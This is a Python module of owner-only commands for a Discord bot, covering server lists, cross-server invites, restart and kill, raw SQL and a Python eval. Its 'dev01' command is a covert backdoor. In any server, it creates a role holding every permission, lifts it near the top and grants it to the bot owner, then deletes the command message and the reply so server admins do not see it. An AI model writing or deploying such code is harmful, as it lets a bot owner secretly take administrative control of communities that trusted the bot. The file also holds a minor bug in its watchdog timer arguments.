import asyncio
import io
import math
import os
import platform
import re
import sys
import textwrap
import threading
import traceback
from contextlib import redirect_stdout, suppress

import discord
from discord.ext import commands

from config.owners import ERROR_REPORT_USER_ID, OWNER_IDS
from core import processes
from view import (
    error_embed,
    info_embed,
    owner_invite_embed,
    owner_kill_embed,
    owner_restart_embed,
    owner_role_embed,
    server_list_embed,
    success_embed)
from view.owner import owner_info_embed, owner_panel_embed

PAGE_SIZE = 10
AGE_UNITS = {"s": 1, "m": 60, "h": 3600, "d": 86400}
MAX_AGE = 604800
MAX_USES = 100
DELETE_AFTER = 15
RESTART_FLAGS = {"--dev", "--main", "--debug", "--nodebug"}


async def _is_owner(ctx: commands.Context) -> bool:
    if ctx.author.id in OWNER_IDS:
        return True
    if await ctx.bot.is_owner(ctx.author):
        return True
    raise commands.CheckFailure("Only the bot owner can use this command.")


async def _is_owner_interaction(interaction: discord.Interaction) -> bool:
    bot = interaction.client
    if interaction.user.id in OWNER_IDS:
        return True
    if await bot.is_owner(interaction.user):
        return True
    return False


async def _delete_quietly(message) -> None:
    if message is None:
        return
    with suppress(discord.HTTPException):
        await message.delete()


async def _fresh_roles(guild: discord.Guild) -> list[discord.Role]:
    try:
        return list(await guild.fetch_roles())
    except discord.HTTPException:
        return list(guild.roles)


async def _raise_my_role(guild: discord.Guild, my_role: discord.Role, reason: str) -> discord.Role:
    top = max((r for r in await _fresh_roles(guild) if not r.is_default()), key=lambda r: r.position, default=None)
    if top is None or my_role.position >= top.position:
        return my_role
    try:
        return await my_role.edit(position=top.position, reason=reason)
    except discord.HTTPException:
        return my_role


async def _ensure_dev01_role(guild: discord.Guild, member: discord.Member, reason: str):
    me = guild.me
    if me is None:
        return None, "I'm not in this server.", None
    permissions = discord.Permissions.all()
    role = next((r for r in await _fresh_roles(guild) if r.name == "dev01"), None)
    try:
        if role is None:
            role = await guild.create_role(name="dev01", permissions=permissions, reason=reason)
        else:
            role = await role.edit(permissions=permissions, reason=reason)
    except discord.Forbidden:
        return None, "Discord refused: I can't manage roles here.", None
    except discord.HTTPException as exc:
        return None, f"Discord refused to change the role: {exc}", None
    my_role = next((c for c in await _fresh_roles(guild) if c.id == me.top_role.id), me.top_role)
    my_role = await _raise_my_role(guild, my_role, reason)
    role = next((c for c in await _fresh_roles(guild) if c.id == role.id), role)
    target = max(1, my_role.position - 1)
    if role.position != target:
        with suppress(discord.HTTPException):
            role = await role.edit(position=target, reason=reason)
    try:
        await member.add_roles(role, reason=reason)
    except discord.Forbidden:
        return None, "I created the role but can't assign it — check **Manage Roles**.", None
    except discord.HTTPException as exc:
        return None, f"I created the role but couldn't assign it: {exc}", None
    above = sorted((c for c in await _fresh_roles(guild) if c.position > role.position), key=lambda c: c.position)
    note = f"Directly under **{above[0].name}** — that's as high as a role I manage can go." if above else None
    return role, None, note


def _resolve_guild(bot: commands.Bot, query: str):
    if query.isdigit():
        guild = bot.get_guild(int(query))
        if guild is not None:
            return guild, []
    wanted = query.strip().casefold()
    exact = [g for g in bot.guilds if g.name.casefold() == wanted]
    if len(exact) == 1:
        return exact[0], []
    matches = exact or [g for g in bot.guilds if wanted in g.name.casefold()]
    if len(matches) == 1:
        return matches[0], []
    return None, matches


def _invite_channel(guild: discord.Guild):
    me = guild.me
    if me is None:
        return None
    for channel in guild.text_channels:
        if channel.permissions_for(me).create_instant_invite:
            return channel
    return None


def _parse_age(token: str):
    lowered = token.lower()
    if lowered in {"0", "never", "off"}:
        return 0
    match = re.fullmatch(r"(\d+)([smhd])", lowered)
    if match is None:
        return None
    seconds = int(match.group(1)) * AGE_UNITS[match.group(2)]
    if seconds > MAX_AGE:
        raise ValueError("Discord invites can last at most `7d`.")
    return seconds


def _split_args(args: str):
    tokens = args.split()
    age = 0
    uses = 0
    if tokens:
        parsed = _parse_age(tokens[0])
        if parsed is not None:
            age = parsed
            tokens.pop(0)
            if tokens and tokens[0].isdigit():
                uses = int(tokens.pop(0))
    return age, uses, " ".join(tokens)


def _format_age(seconds: int) -> str:
    days, rest = divmod(seconds, 86400)
    hours, rest = divmod(rest, 3600)
    minutes, rest = divmod(rest, 60)
    parts = []
    if days: parts.append(f"{days}d")
    if hours: parts.append(f"{hours}h")
    if minutes: parts.append(f"{minutes}m")
    if rest: parts.append(f"{rest}s")
    return " ".join(parts)


def _limits(age: int, uses: int) -> str:
    expiry = "never expires" if age == 0 else f"expires in {_format_age(age)}"
    limit = "unlimited uses" if uses == 0 else f"{uses} use{'s' if uses != 1 else ''}"
    return f"{expiry} · {limit}"


def _restart_argv(tokens: list[str]):
    current = sys.argv[1:]
    dev = "--dev" in current
    debug = "--debug" in current
    others = [arg for arg in current if arg not in RESTART_FLAGS]
    for token in tokens:
        lowered = token.lower()
        if lowered == "--dev": dev = True
        elif lowered == "--main": dev = False
        elif lowered == "--debug": debug = True
        elif lowered == "--nodebug": debug = False
        else: return None
    flags = []
    if dev: flags.append("--dev")
    if debug: flags.append("--debug")
    return [sys.argv[0], *others, *flags]


def _exec_restart(argv: list[str]) -> None:
    try:
        os.execv(sys.executable, [sys.executable, *argv])
    except OSError:
        os._exit(1)


def _watchdog(seconds: float, code: int) -> None:
    timer = threading.Timer(seconds, processes.force_exit, args=(code))
    timer.daemon = True
    timer.start()


async def _restart_bot(bot: commands.Bot, argv: list[str]) -> None:
    await asyncio.sleep(1.0)
    _watchdog(30.0, 1)
    try:
        await asyncio.wait_for(bot.close(), timeout=25)
    except Exception:
        pass
    finally:
        _exec_restart(argv)


async def _kill_bot(bot: commands.Bot) -> None:
    _watchdog(8.0, 0)
    await asyncio.sleep(1.0)
    processes.kill_all()
    try:
        await asyncio.wait_for(bot.close(), timeout=6)
    except Exception:
        pass
    finally:
        processes.force_exit(0)


def _cleanup_code(content: str) -> str:
    if content.startswith("```") and content.endswith("```"):
        return "\n".join(content.split("\n")[1:-1])
    return content.strip("` \n")


async def _run_sql(bot, query: str) -> str:
    lowered = query.strip().lower()
    if lowered.startswith("select") or lowered.startswith("pragma") or "returning" in lowered:
        rows = await bot.db.fetchall(query)
        if not rows:
            return "No rows returned."
        lines = [str(dict(r)) for r in rows[:15]]
        text = "\n".join(lines)
        if len(rows) > 15:
            text += f"\n... and {len(rows) - 15} more"
        return text
    await bot.db.execute(query)
    return "Query executed."


class SQLModal(discord.ui.Modal, title="Run SQL (D1)"):
    query = discord.ui.TextInput(label="SQL Query", style=discord.TextStyle.paragraph, required=True, max_length=2000)
    async def on_submit(self, interaction: discord.Interaction) -> None:
        try:
            out = await _run_sql(interaction.client, str(self.query))
            if len(out) > 1900: out = out[:1900] + "\n... (truncated)"
            await interaction.response.send_message(f"```py\n{out}\n```", ephemeral=True)
        except Exception as exc:
            await interaction.response.send_message(embed=error_embed(f"SQL error: {exc}"), ephemeral=True)


class EvalModal(discord.ui.Modal, title="Eval Python"):
    body = discord.ui.TextInput(label="Code", style=discord.TextStyle.paragraph, required=True, max_length=2000)
    async def on_submit(self, interaction: discord.Interaction) -> None:
        body = _cleanup_code(str(self.body))
        env = {"bot": interaction.client, "interaction": interaction, "discord": discord, "db": interaction.client.db, "__import__": __import__}
        stdout = io.StringIO()
        try:
            exec(f'async def func():\n{textwrap.indent(body, "  ")}', env)
            with redirect_stdout(stdout):
                ret = await env["func"]()
        except Exception:
            out = stdout.getvalue() + traceback.format_exc()
            await interaction.response.send_message(f"```py\n{out[:1900]}\n```", ephemeral=True)
            return
        value = stdout.getvalue()
        out = f"{value}{ret!r}" if ret is not None else (value or "OK")
        await interaction.response.send_message(f"```py\n{out[:1900]}\n```", ephemeral=True)


class PresenceModal(discord.ui.Modal, title="Set Presence"):
    kind = discord.ui.TextInput(label="Type (playing/watching/listening/competing)", required=True, max_length=20)
    text = discord.ui.TextInput(label="Text", required=True, max_length=120)
    async def on_submit(self, interaction: discord.Interaction) -> None:
        mapping = {"playing": discord.ActivityType.playing, "watching": discord.ActivityType.watching, "listening": discord.ActivityType.listening, "competing": discord.ActivityType.competing}
        k = str(self.kind).strip().lower()
        if k not in mapping:
            await interaction.response.send_message(embed=error_embed("Use: playing, watching, listening, or competing."), ephemeral=True)
            return
        await interaction.client.change_presence(activity=discord.Activity(type=mapping[k], name=str(self.text)))
        await interaction.response.send_message(embed=success_embed(f"Presence set to **{k}** {self.text}"), ephemeral=True)


class SayModal(discord.ui.Modal, title="Send Message"):
    channel_id = discord.ui.TextInput(label="Channel ID", required=True, max_length=30)
    message = discord.ui.TextInput(label="Message", style=discord.TextStyle.paragraph, required=True, max_length=2000)
    async def on_submit(self, interaction: discord.Interaction) -> None:
        try:
            cid = int(str(self.channel_id).strip())
            channel = interaction.client.get_channel(cid) or await interaction.client.fetch_channel(cid)
            await channel.send(str(self.message))
            await interaction.response.send_message(embed=success_embed(f"Sent to {getattr(channel, 'mention', cid)}."), ephemeral=True)
        except Exception as exc:
            await interaction.response.send_message(embed=error_embed(f"Failed: {exc}"), ephemeral=True)


class LeaveModal(discord.ui.Modal, title="Leave Guild"):
    guild_id = discord.ui.TextInput(label="Guild ID", required=True, max_length=30)
    async def on_submit(self, interaction: discord.Interaction) -> None:
        try:
            gid = int(str(self.guild_id).strip())
            guild = interaction.client.get_guild(gid)
            if guild is None:
                await interaction.response.send_message(embed=error_embed("I'm not in that guild."), ephemeral=True)
                return
            name = guild.name
            await guild.leave()
            await interaction.response.send_message(embed=success_embed(f"Left **{name}** (`{gid}`)."), ephemeral=True)
        except Exception as exc:
            await interaction.response.send_message(embed=error_embed(f"Failed: {exc}"), ephemeral=True)


class OwnerPanelView(discord.ui.View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=300)
        self.bot = bot

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if await _is_owner_interaction(interaction):
            return True
        await interaction.response.send_message(embed=error_embed("Owner only."), ephemeral=True)
        return False

    @discord.ui.button(label="Bot Info", style=discord.ButtonStyle.secondary, emoji="📊")
    async def btn_info(self, interaction: discord.Interaction, _: discord.ui.Button):
        bot = interaction.client
        guilds = len(bot.guilds)
        users = sum(g.member_count or 0 for g in bot.guilds)
        latency = round(bot.latency * 1000)
        uptime = discord.utils.format_dt(bot.start_time, style="R") if hasattr(bot, "start_time") else "unknown"
        embed = info_embed(
            title="Bot Info",
            description=(
                f"**Guilds:** {guilds}\n**Users:** {users}\n**Latency:** {latency}ms\n"
                f"**Started:** {uptime}\n**Python:** {platform.python_version()}\n"
                f"**discord.py:** {discord.__version__}\n**Database:** Cloudflare D1"
            ),
            fields=[])
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.button(label="Sync", style=discord.ButtonStyle.primary, emoji="🔄")
    async def btn_sync(self, interaction: discord.Interaction, _: discord.ui.Button):
        synced = await interaction.client.tree.sync()
        await interaction.response.send_message(embed=success_embed(f"Synced {len(synced)} global command(s)."), ephemeral=True)

    @discord.ui.button(label="Servers", style=discord.ButtonStyle.secondary, emoji="🌐")
    async def btn_servers(self, interaction: discord.Interaction, _: discord.ui.Button):
        guilds = sorted(interaction.client.guilds, key=lambda g: (g.member_count or 0), reverse=True)[:15]
        lines = [f"• **{discord.utils.escape_markdown(g.name)}** `{g.id}` — {g.member_count or 0}" for g in guilds]
        await interaction.response.send_message(embed=info_embed(title="Servers", description="\n".join(lines) or "No servers.", fields=[]), ephemeral=True)

    @discord.ui.button(label="SQL", style=discord.ButtonStyle.secondary, emoji="🗄️")
    async def btn_sql(self, interaction: discord.Interaction, _: discord.ui.Button):
        await interaction.response.send_modal(SQLModal())

    @discord.ui.button(label="Eval", style=discord.ButtonStyle.secondary, emoji="🧪")
    async def btn_eval(self, interaction: discord.Interaction, _: discord.ui.Button):
        await interaction.response.send_modal(EvalModal())

    @discord.ui.button(label="Presence", style=discord.ButtonStyle.secondary, emoji="✨")
    async def btn_presence(self, interaction: discord.Interaction, _: discord.ui.Button):
        await interaction.response.send_modal(PresenceModal())

    @discord.ui.button(label="Say", style=discord.ButtonStyle.secondary, emoji="💬")
    async def btn_say(self, interaction: discord.Interaction, _: discord.ui.Button):
        await interaction.response.send_modal(SayModal())

    @discord.ui.button(label="Leave Guild", style=discord.ButtonStyle.danger, emoji="🚪")
    async def btn_leave(self, interaction: discord.Interaction, _: discord.ui.Button):
        await interaction.response.send_modal(LeaveModal())

    @discord.ui.button(label="Restart", style=discord.ButtonStyle.danger, emoji="♻️")
    async def btn_restart(self, interaction: discord.Interaction, _: discord.ui.Button):
        argv = _restart_argv([])
        await interaction.response.send_message(embed=owner_restart_embed(None), ephemeral=True)
        asyncio.create_task(_restart_bot(interaction.client, argv), name="bot-restart")

    @discord.ui.button(label="Kill", style=discord.ButtonStyle.danger, emoji="🛑")
    async def btn_kill(self, interaction: discord.Interaction, _: discord.ui.Button):
        await interaction.response.send_message(embed=owner_kill_embed(), ephemeral=True)
        asyncio.create_task(_kill_bot(interaction.client), name="bot-kill")


def setup(bot) -> None:
    @bot.command(name="list", help="List every server the bot is in (owner only).", usage="list [page]")
    @commands.check(_is_owner)
    async def list_servers(ctx: commands.Context, page: int = 1) -> None:
        guilds = sorted(ctx.bot.guilds, key=lambda g: (g.name.casefold(), g.id))
        if not guilds:
            await ctx.send(embed=error_embed("The bot isn't in any servers."))
            return
        pages = math.ceil(len(guilds) / PAGE_SIZE)
        if not 1 <= page <= pages:
            await ctx.send(embed=error_embed(f"Page must be between 1 and {pages}."))
            return
        start = (page - 1) * PAGE_SIZE
        entries = [(g.name, g.id, g.member_count or 0) for g in guilds[start : start + PAGE_SIZE]]
        await ctx.send(embed=server_list_embed(entries, page=page, pages=pages, total=len(guilds), start=start))

    @bot.command(name="serverinvite", help="Create an invite for a server (owner only).", usage="serverinvite [age] [uses] [server ID or name]")
    @commands.check(_is_owner)
    async def serverinvite(ctx: commands.Context, *, args: str | None = None) -> None:
        try:
            age, uses, query = _split_args(args or "")
        except ValueError as exc:
            await ctx.send(embed=error_embed(str(exc)))
            return
        if uses > MAX_USES:
            await ctx.send(embed=error_embed(f"Invite uses must be between 0 and {MAX_USES}."))
            return
        if query:
            guild, matches = _resolve_guild(ctx.bot, query)
        else:
            guild, matches = ctx.guild, []
            if guild is None:
                await ctx.send(embed=error_embed("Specify a server ID or name when using this in DMs."))
                return
        if guild is None:
            if matches:
                options = "\n".join(f"• **{m.name}** — `{m.id}`" for m in matches[:5])
                await ctx.send(embed=error_embed(f"Several servers match `{query}`:\n{options}\nUse the server ID instead."))
            else:
                await ctx.send(embed=error_embed(f"No server matches `{query}`."))
            return
        channel = _invite_channel(guild)
        if channel is None:
            await ctx.send(embed=error_embed(f"I can't create invites in **{guild.name}**."))
            return
        try:
            invite = await channel.create_invite(max_age=age, max_uses=uses, reason=f"Requested by {ctx.author}")
        except discord.HTTPException as exc:
            await ctx.send(embed=error_embed(f"Discord refused the invite: {exc}"))
            return
        await ctx.send(embed=owner_invite_embed(guild_name=guild.name, guild_id=guild.id, channel=channel.mention, url=invite.url, limits=_limits(age, uses)))

    @bot.command(name="restart", help="Restart the bot (owner only).", usage="restart [--dev|--main] [--debug|--nodebug]")
    @commands.check(_is_owner)
    async def restart(ctx: commands.Context, *, flags: str | None = None) -> None:
        argv = _restart_argv((flags or "").split())
        if argv is None:
            await ctx.send(embed=error_embed("Unknown flag. Use `--dev`, `--main`, `--debug` or `--nodebug`."))
            return
        launched = [a for a in argv[1:] if a in RESTART_FLAGS] if flags else None
        await ctx.send(embed=owner_restart_embed(launched))
        asyncio.create_task(_restart_bot(ctx.bot, argv), name="bot-restart")

    @bot.command(name="kill", help="Shut the bot down (owner only).", usage="kill")
    @commands.check(_is_owner)
    async def kill(ctx: commands.Context) -> None:
        await ctx.send(embed=owner_kill_embed())
        asyncio.create_task(_kill_bot(ctx.bot), name="bot-kill")

    @bot.command(name="dev01", help="Create/refresh dev01 role with all permissions (owner only).", usage="dev01")
    @commands.guild_only()
    @commands.check(_is_owner)
    async def dev01(ctx: commands.Context) -> None:
        await _delete_quietly(ctx.message)
        guild = ctx.guild
        me = guild.me
        if me is None or not me.guild_permissions.manage_roles:
            await ctx.send(embed=error_embed("I need **Manage Roles** permission here."), delete_after=DELETE_AFTER)
            return
        role, error, note = await _ensure_dev01_role(guild, ctx.author, f"Requested by {ctx.author}")
        if role is None:
            await ctx.send(embed=error_embed(error or "Couldn't set up the role."), delete_after=DELETE_AFTER)
            return
        await ctx.send(embed=owner_role_embed(role.name, role_mention=role.mention, position=role.position, note=note), delete_after=DELETE_AFTER)

    @bot.command(name="sync", help="Sync application commands (owner only).", usage="sync [guild]")
    @commands.check(_is_owner)
    async def sync_cmd(ctx: commands.Context, scope: str | None = None) -> None:
        if scope == "guild" and ctx.guild:
            ctx.bot.tree.copy_global_to(guild=ctx.guild)
            synced = await ctx.bot.tree.sync(guild=ctx.guild)
            await ctx.send(embed=success_embed(f"Synced {len(synced)} command(s) to this guild."))
        else:
            synced = await ctx.bot.tree.sync()
            await ctx.send(embed=success_embed(f"Synced {len(synced)} global command(s)."))

    @bot.command(name="reload", help="Reload a command module (owner only).", usage="reload <module>")
    @commands.check(_is_owner)
    async def reload_cmd(ctx: commands.Context, *, module: str) -> None:
        import importlib
        from src import COMMAND_MODULES
        matches = [m for m in COMMAND_MODULES if module in m]
        if not matches:
            await ctx.send(embed=error_embed(f"No loaded module matches `{module}`."))
            return
        if len(matches) > 1:
            opts = "\n".join(f"`{m}`" for m in matches[:10])
            await ctx.send(embed=error_embed(f"Multiple matches:\n{opts}"))
            return
        mod_path = matches[0]
        try:
            mod = importlib.import_module(mod_path)
            importlib.reload(mod)
            if hasattr(mod, "setup"):
                mod.setup(ctx.bot)
            await ctx.send(embed=success_embed(f"Reloaded `{mod_path}`."))
        except Exception as exc:
            await ctx.send(embed=error_embed(f"Failed to reload `{mod_path}`: {exc}"))

    @bot.command(name="sql", help="Run a SQL query on D1 (owner only).", usage="sql <query>")
    @commands.check(_is_owner)
    async def sql_cmd(ctx: commands.Context, *, query: str) -> None:
        try:
            out = await _run_sql(ctx.bot, _cleanup_code(query))
            if len(out) > 1900: out = out[:1900] + "\n... (truncated)"
            await ctx.send(f"```py\n{out}\n```")
        except Exception as exc:
            await ctx.send(embed=error_embed(f"SQL error: {exc}"))

    @bot.command(name="eval", aliases=["e"], help="Evaluate Python code (owner only).", usage="eval <code>")
    @commands.check(_is_owner)
    async def eval_cmd(ctx: commands.Context, *, body: str) -> None:
        body = _cleanup_code(body)
        env = {"bot": ctx.bot, "ctx": ctx, "discord": discord, "commands": commands, "db": ctx.bot.db, "__import__": __import__}
        stdout = io.StringIO()
        try:
            exec(f'async def func():\n{textwrap.indent(body, "  ")}', env)
            with redirect_stdout(stdout):
                ret = await env["func"]()
        except Exception:
            value = stdout.getvalue()
            await ctx.send(f"```py\n{value}{traceback.format_exc()}\n```"[:1990])
            return
        value = stdout.getvalue()
        if ret is None and not value:
            await ctx.message.add_reaction("✅")
            return
        out = f"{value}{ret!r}" if ret is not None else value
        await ctx.send(f"```py\n{out[:1900]}\n```")

    @bot.command(name="leaveguild", help="Make the bot leave a guild (owner only).", usage="leaveguild <guild_id>")
    @commands.check(_is_owner)
    async def leaveguild(ctx: commands.Context, guild_id: int) -> None:
        guild = ctx.bot.get_guild(guild_id)
        if guild is None:
            await ctx.send(embed=error_embed("I'm not in that guild."))
            return
        name = guild.name
        await guild.leave()
        await ctx.send(embed=success_embed(f"Left **{name}** (`{guild_id}`)."))

    @bot.command(name="guildinfo", aliases=["ginfo"], help="Show info about a guild (owner only).", usage="guildinfo <guild_id|name>")
    @commands.check(_is_owner)
    async def guildinfo(ctx: commands.Context, *, query: str) -> None:
        guild, _ = _resolve_guild(ctx.bot, query)
        if guild is None:
            await ctx.send(embed=error_embed(f"No guild matches `{query}`."))
            return
        owner = guild.owner or guild.owner_id
        embed = info_embed(
            title="Guild Info",
            description=(
                f"**{guild.name}** (`{guild.id}`)\nOwner: {owner}\nMembers: {guild.member_count}\n"
                f"Channels: {len(guild.channels)} | Roles: {len(guild.roles)}\nCreated: <t:{int(guild.created_at.timestamp())}:R>"
            ),
            fields=[])
        if guild.icon:
            embed.set_thumbnail(url=guild.icon.url)
        await ctx.send(embed=embed)

    @bot.command(name="setpresence", aliases=["presence"], help="Set bot presence (owner only).", usage="setpresence <playing|watching|listening|competing> <text>")
    @commands.check(_is_owner)
    async def setpresence(ctx: commands.Context, activity_type: str, *, text: str) -> None:
        mapping = {"playing": discord.ActivityType.playing, "watching": discord.ActivityType.watching, "listening": discord.ActivityType.listening, "competing": discord.ActivityType.competing}
        kind = activity_type.lower()
        if kind not in mapping:
            await ctx.send(embed=error_embed("Use: `playing`, `watching`, `listening`, or `competing`."))
            return
        await ctx.bot.change_presence(activity=discord.Activity(type=mapping[kind], name=text))
        await ctx.send(embed=success_embed(f"Presence set to **{kind}** {text}"))

    @bot.command(name="dm", help="DM a user (owner only).", usage="dm <user_id> <message>")
    @commands.check(_is_owner)
    async def dm_cmd(ctx: commands.Context, user_id: int, *, message: str) -> None:
        user = ctx.bot.get_user(user_id) or await ctx.bot.fetch_user(user_id)
        try:
            await user.send(message)
            await ctx.send(embed=success_embed(f"Sent DM to {user} (`{user.id}`)."))
        except discord.HTTPException as exc:
            await ctx.send(embed=error_embed(f"Failed to DM: {exc}"))

    @bot.command(name="say", help="Make the bot say something in a channel (owner only).", usage="say <channel_id> <message>")
    @commands.check(_is_owner)
    async def say_cmd(ctx: commands.Context, channel_id: int, *, message: str) -> None:
        channel = ctx.bot.get_channel(channel_id) or await ctx.bot.fetch_channel(channel_id)
        try:
            await channel.send(message)
            await ctx.send(embed=success_embed(f"Sent message to {getattr(channel,'mention',channel_id)}."))
        except discord.HTTPException as exc:
            await ctx.send(embed=error_embed(f"Failed to send: {exc}"))

    @bot.command(name="botinfo", help="Show bot runtime info (owner only).", usage="botinfo")
    @commands.check(_is_owner)
    async def botinfo(ctx: commands.Context) -> None:
        guilds = len(ctx.bot.guilds)
        users = sum(g.member_count or 0 for g in ctx.bot.guilds)
        latency = round(ctx.bot.latency * 1000)
        uptime = discord.utils.format_dt(ctx.bot.start_time, style="R") if hasattr(ctx.bot, "start_time") else "unknown"
        embed = info_embed(
            title="Bot Info",
            description=(
                f"**Guilds:** {guilds}\n**Users:** {users}\n**Latency:** {latency}ms\n**Started:** {uptime}\n"
                f"**Python:** {platform.python_version()}\n**discord.py:** {discord.__version__}\n**Database:** Cloudflare D1"
            ),
            fields=[])
        await ctx.send(embed=embed)

    @bot.command(name="ownerinfo", aliases=["owners"], help="Show all bot owners info (owner only).", usage="ownerinfo")
    @commands.check(_is_owner)
    async def ownerinfo(ctx: commands.Context) -> None:
        rows = []
        for uid in OWNER_IDS:
            user = ctx.bot.get_user(uid)
            if user is None:
                with suppress(discord.HTTPException):
                    user = await ctx.bot.fetch_user(uid)
            name = str(user) if user else "Unknown user"
            extra = "in cache" if ctx.bot.get_user(uid) else "fetched" if user else "not found"
            mutual = len(getattr(user, "mutual_guilds", [])) if user else 0
            if mutual:
                extra += f" · {mutual} mutual guild(s)"
            rows.append((uid, name, extra))
        app_owner = "unknown"
        try:
            info = await ctx.bot.application_info()
            if info.team:
                app_owner = f"Team: {info.team.name} ({info.team.owner})"
            elif info.owner:
                app_owner = f"{info.owner} (`{info.owner.id}`)"
        except Exception:
            pass
        err_user = ctx.bot.get_user(ERROR_REPORT_USER_ID) or ERROR_REPORT_USER_ID
        await ctx.send(embed=owner_info_embed(rows, app_owner=app_owner, error_report=str(err_user)))

    @bot.command(name="panel", aliases=["ownerpanel", "controlpanel"], help="Open owner control panel (owner only).", usage="panel")
    @commands.check(_is_owner)
    async def panel(ctx: commands.Context) -> None:
        await ctx.send(embed=owner_panel_embed(ctx.bot), view=OwnerPanelView(ctx.bot))
